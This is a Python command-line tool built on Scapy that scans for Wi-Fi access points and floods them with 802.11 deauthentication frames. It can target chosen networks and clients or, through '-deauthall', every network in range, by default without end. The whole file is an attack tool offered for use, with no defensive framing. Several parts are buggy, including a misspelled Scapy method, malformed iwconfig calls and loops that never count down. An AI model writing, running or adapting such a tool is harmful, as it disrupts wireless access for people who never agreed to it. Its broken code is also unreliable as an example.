import argparse
import sys
import os
import time
import logging
import subprocess
from scapy.all import *
from threading import Thread
from scapy.layers.dot11 import Dot11, Dot11Deauth

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)   #To suppress runtime error logs
conf.verb = 0  #showing only error messages by scapy

def get_input():
    parser = argparse.ArgumentParser(description="""
    Scan Networks
        -scan       Command
        -i or -mon  Interfaces
        -cf         Output format
        -t          Set channel delay
        -nr         no rescan
        
    Deauth Network
        -deauth     Command
        -b          Bssid
        -u          Client
        -i or -mon  Interface
        -p          Packetexp
        -t          Time Interval
    
    Deauth All Networks
        -deauthall  Command
        -i or -mon  Interface
        -p          Packetexp
        """, formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument("-i", "--interface", type=str, required=True, help="Enter monitoring interface")
    parser.add_argument("-mon", "--monitor", action="store_true", help="Activate monitoring mode and automatically searches WLAN device.")
    parser.add_argument("-scan", action="store_true", help="Searches for all available WiFi-Networks")
    parser.add_argument("-cf", "--channelformat", action="store_true", help="Activates the channel format.")
    parser.add_argument("-t", "--timeout", type=int, help="Setting a delay for deauth attack or switching the channel while scanning.")
    parser.add_argument("-nr", "--norescan", action="store_true", help="When channel 14 is reached stop scan")
    parser.add_argument("-deauth", action="store_true", help="deauth attack BSSID")
    parser.add_argument("-deauthall", action="store_true", help="Searches all the WiFi Networks deauth attacks")
    parser.add_argument("-b", "--bssid", nargs="*", help="Add BSSID to a deauth")
    parser.add_argument("-u", "--client", default='FF:FF:FF:FF:FF:FF', help="Adds a client to a deauth attack. Broadcast")
    parser.add_argument("-c", "--channel", type=int, help="Adds a channel to a deauth attack.")
    parser.add_argument("-p", "--packetexp", type=int, default=64, help="Amount of packets in one burst")
    parser.add_argument("-a", "--amount", type=int, default=0, help="amount of deauth packages to send")
    return parser

def validate_arguments(args):
    if not args.deauth and not args.scan and not args.deauthall and not args.monitor:
        get_input().print_usage()
        sys.exit(0)
    if not args.monitor and not args.interface:
        print("No interface selected !")
        sys.exit(0)
    if args.interface and args.monitor:
        print("Just give one of them")
        sys.exit(0)
    if args.scan and args.deauth:
        print("Scan and deauth cant execute the same time!")
        sys.exit(0)
    if args.scan and args.bssid:
        print("Invalid parameter when scanning!")
        sys.exit(0)
    if args.scan and args.amount:
        print("Invalid parameter when scanning!")
        sys.exit(0)
    if args.scan and args.packetexp != 64:
        print("Invalid parameter when scanning!")
    if args.deauth and not args.bssid:
        print("Error!!! Select bssid ")
        sys.exit(0)
    if args.deauth and args.channelformat:
        print("Invalid parameter when deauthing!")
        sys.exit(0)
    if args.deauth and args.norescan:
        print("Invalid parameter when deauthing!")
    if args.deauthall:
        if args.scan or args.norescan or args.deauth or args.channelformat or args.channel or args.timeout or args.bssid or args.amount:
            print("Just enter interface and packetexp")
            sys.exit(0)
    if args.bssid and args.client != "FF:FF:FF:FF:FF:FF":
        if len(args.bssid) > 1:
            print("Unable to add clients if there are multiple bssid")
            sys.exit(0)


def packet_handler(packet):
    global APs
    if packet.hasLayer(Dot11):  # Dot11 layer used in Wi-Fi traffic
        if packet.type == 0 and packet.subtype == 8:  #Management frame containing information about the AP
            if packet.addr2 not in APs:  #MAC adress
                APs[packet.addr2] = 0  #Initialize the channel information
                output_aps(packet.addr2, packet.info, APs[packet.addr2])


def output_aps(bssid, essid, channel):
    print(str(bssid), str(channel) + "  ", str(essid))


def change_channel():
    global on_channel, iface
    timeout = 1

    if args.timeout:
        timeout = args.timeout
    while True:
        if on_channel > 14:
            if args.norescan:
                print("Press ctrl+c to quit...")
                sys.exit(0)
            elif not rescan:
                break
            else:
                on_channel = 1
                continue
        subprocess.run(["iwconfig ", iface, " channel ", str(on_channel)])
        time.sleep(timeout)
        on_channel += 1



def set_channel():
    channel = 2
    if args.channel:
        channel = args.channel
    os.system("iwconfig " + iface + " channel " + str(channel))


def deauth(args):
    bssid = args.bssid
    client = args.client
    amount = args.amount
    sleep = 0
    endless = False

    if amount == 0:
        endless = True
    if args.timeout:
        sleep = args.timeout

    client_ap_packet = None
    while endless:
        for ap in bssid:
            ap_client_packet = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
            #addr1 target mac addr2 source mac addr3 real source mac
            if client != "FF:FF:FF:FF:FF:FF":
                client_ap_packet = Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()
            try:
                for count in range(args.packetexp):
                    send(ap_client_packet)
                    if client != "FF:FF:FF:FF:FF:FF":
                        send(client_ap_packet)
                print("Sent Deauth Packets to " + ap)
            except KeyboardInterrupt:
                print("\nEnding Script...")
                sys.exit(0)
    while amount > 1 and not endless:
        for ap in bssid:
            ap_client_packet = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
            if client != "FF:FF:FF:FF:FF:FF":
                client_ap_packet = Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()
            try:
                for count in range(args.packetexp):
                    send(ap_client_packet)
                    if client != "FF:FF:FF:FF:FF:FF":
                        send(client_ap_packet)
                print("Sent Deauth Packets to " + ap)
            except KeyboardInterrupt:
                print("\n Ending Script...")
                sys.exit(0)

    print("Finished Successfully")


def deauth_all():
    global iface
    print("Deauthentication Started")

    original_channel = APs[list(APs.keys())[0]]  # Assuming at least one AP is discovered

    while True:
        for ap in APs:
            for count in range(args.packetexp):
                try:
                    ap_client_packet = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap, addr3=ap)/Dot11Deauth()
                    subprocess.run(["iwconfig", iface, "channel", str(APs[ap])])
                    send(ap_client_packet)
                except KeyboardInterrupt:
                    print("Ending Script...")
                    subprocess.run(["iwconfig", iface, "channel", str(original_channel)])  # Revert back to original channel
                    sys.exit(0)
            print("Sent Deauth Packets to", ap)


def monitor_mode():
    ifaces = os.listdir("/sys/class/net")
    for iface in ifaces:
        if "wlan" in iface:
            os.system('ifconfig ' + iface + ' down')
            os.system('iwconfig ' + iface + ' mode monitor')
            os.system('ifconfig ' + iface + ' up')
            return iface
    print("No interface found")
    sys.exit(0)


if __name__ == "__main__":
    args = get_input().parse_args()
    APs = {}
    rescan = True

    validate_arguments(args)

    iface = None
    if args.interface:
        iface = args.interface
    if args.monitor:
        iface = monitor_mode()

    conf.iface = iface

    if args.scan:
        thread = Thread(target=change_channel, args=[])
        thread.daemon = True
        thread.start()

    if args.deauth:
        set_channel()
        deauth(args)

    if args.deauthall:
        rescan = False

        thread = Thread(target=change_channel, args=[])
        thread.daemon = True
        thread.start()

        sniff(iface=iface, prn=packet_handler, store=0, timeout=14)
        deauth_all()
